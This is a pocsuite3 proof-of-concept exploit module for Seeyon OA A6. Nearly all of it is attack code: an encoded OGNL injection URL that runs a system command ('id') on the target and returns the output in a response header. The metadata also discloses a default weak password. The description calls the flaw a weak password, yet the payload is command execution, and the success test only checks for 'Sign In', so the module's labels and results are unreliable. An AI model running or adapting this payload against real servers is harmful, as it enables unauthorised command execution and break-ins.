from pocsuite3.api import Output, POCBase, POC_CATEGORY, register_poc, requests, VUL_TYPE

class DemoPOC(POCBase):
    vulID = '001'  # ssvid
    version = '1.0'
    author = ['w7ay']
    vulDate = '2019-04-04'
    createDate = '2019-04-04'
    updateDate = '2019-04-04'
    references = ['https://www.cnblogs.com/AtesetEnginner/p/12106741.html']
    name = '致远OA弱口令'
    appPowerLink = ''
    appName = '用友致远软件技术有限公司'
    appVersion = 'A6'
    vulType = VUL_TYPE.CODE_EXECUTION
    desc = '''致远OA A6老版本下的未授权访问＋弱口令：WLCCYBD@SEEYON'''
    samples = []
    install_requires = ['']
    category = POC_CATEGORY.EXPLOITS.WEBAPP

    def _verify(self):
        result = {}
        try:
            target = self.url+"/%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22id%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D/"
            r = requests.get(url=target,timeout=8,verify=False)
            if r.status_code == 200 and "Sign In" in r.text:
                result['FileInfo'] = {}
                result['FileInfo']['URL'] = target
                return self.parse_verify(result)
        except:
            return
    def parse_verify(self,result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output

register_poc(DemoPOC)